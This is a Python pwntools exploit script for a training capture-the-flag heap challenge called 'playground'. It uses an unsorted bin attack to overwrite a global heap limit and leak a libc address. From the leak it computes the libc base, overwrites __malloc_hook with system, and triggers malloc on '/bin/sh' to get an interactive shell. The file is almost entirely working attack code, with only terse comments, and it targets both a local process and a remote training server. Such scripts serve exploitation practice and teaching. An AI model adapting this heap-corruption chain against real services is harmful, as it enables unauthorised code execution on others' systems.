from pwn import *
#import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./playground")
    gdb.attach(r, '''
            #b *0x0010129e
            c
            ''')
    input("wait")
else:
    r = remote("bin.training.offdef.it", 4110)

libc = ELF('./libc-2.27.so')

r.recvuntil(b'pid: ')
pid = int(r.recvuntil(b'\n'))
r.recvuntil(b'main: ')
main = int(r.recvuntil(b'\n'), 0)

print('[!]pid = {}\n[!]main = {}'.format(pid, hex(main)))

def malloc(n):
	r.recvuntil(b'> ')
	r.sendline('malloc ' + str(n))
	r.recvuntil(b'==> ')
	return int(r.recvuntil(b'\n'), 0)

def free(p):
	r.recvuntil(b'> ')
	r.sendline('free ' + hex(p))
	r.recvuntil(b'==> ok')

def show(p, n=1, v=False):
	r.recvuntil('> ')
	r.sendline('show ' + hex(p) + ' ' + str(n))
	d = {}
	for i in range(n):
		pointer = int(r.recvuntil(b':')[:-1], 0)
		content = r.recvuntil(b'\n')
		#print('P = ' + str(pointer) + '; C = ' + content + ' len=' + str(len(content)))
		c = 0
		if len(content) != 1:
			c = int(content, 0)
		d[pointer] = c

	if v:
		for k in d:
			print(hex(k) + ': ' + hex(d[k]))

	return d

def write(p, content):
	r.recvuntil(b'> ')
	r.sendline('write ' + hex(p) + ' ' + str(len(content)))
	r.recvuntil(b'==> read\n')
	r.send(content)
	r.recvuntil(b'==> done\n')


a = malloc(0x410)
b = malloc(500) # discard

free(a)
print(hex(a))
# find address of max_heao with gdb command 'p &max_heap'
# calculate the offset from the main
target = main + 0x2ec7
print("[!]target: {}".format(hex(target)))
#input("wait")
# write to max_heap location (target)
write(a + 8, p64(target - 0x10))
#input("wait")

c = malloc(0x410) # discard

print("[!] now max_heap should be different!")
input("wait")
libc_leak = show(target, n=1, v=False)[target]

print("[!] leak: {}".format(hex(libc_leak)))

malloc_hook_location = libc_leak - 0x70
libc.address = malloc_hook_location - 0x3ebc30

bin_sh = next(libc.search(b'/bin/sh\0'))

print("[!] bin_sh: {}".format(hex(bin_sh)))

#write(c, p64(0xdeadbeef) + p64(bin_sh))
write(malloc_hook_location, p64(libc.symbols['system']))

r.recvuntil('> ')
r.sendline('malloc ' + str(bin_sh))

r.interactive()